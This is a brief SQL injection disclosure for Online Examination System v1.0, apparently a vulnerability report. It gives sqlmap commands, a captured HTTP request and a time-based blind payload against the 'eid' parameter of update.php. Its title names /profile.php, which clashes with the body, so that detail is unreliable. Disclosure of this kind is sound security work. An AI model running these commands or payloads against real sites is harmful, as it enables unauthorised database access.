# SQLi vulnerability in Online Examination System v1.0 of file /profile.php

**vender**:

- Online Examination System

**SoftLink**:

- https://projectworlds.in/free-projects/php-projects/online-examination/

**Vulnerable File**

- /update.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
GET /online-examination-systen/update.php?q=quizre&step=25&eid=1 HTTP/1.1
Host: 192.168.129.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=v43kk28qqva4ntobshvd2bhfm7; G55gnuboard5PHPSESSID=nm79ejnaiinb8lddnkihea90q4; 2a0d2363701f23f8a75028924a3af643=MTkyLjE2OC4xMjkuMQ%3D%3D; 2e61f26e7a4e8194d3d5d054536403e0=MTZhMzRlM2E0ZGM2YWZjMWIwZGQxMmUxYjg4MGRjOGU%3D; 6e1280981e1dfd9169c5dea9c28ff2e3=YWRtaW4%3D; a3e94372a6379bc1ae3698dfdf38595b=ZDA1MWM3MTM1ZDZhMDc0YjJjOWExYjNmNmM4YTM3MTA%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
```



```bash
sqlmap -r request.txt --level 5 --random-agent 
```



```
---
Parameter: eid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=quizre&step=25&eid=1' AND (SELECT 7803 FROM (SELECT(SLEEP(5)))vvPI)-- aGgZ
---
```

![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505310414826.png)

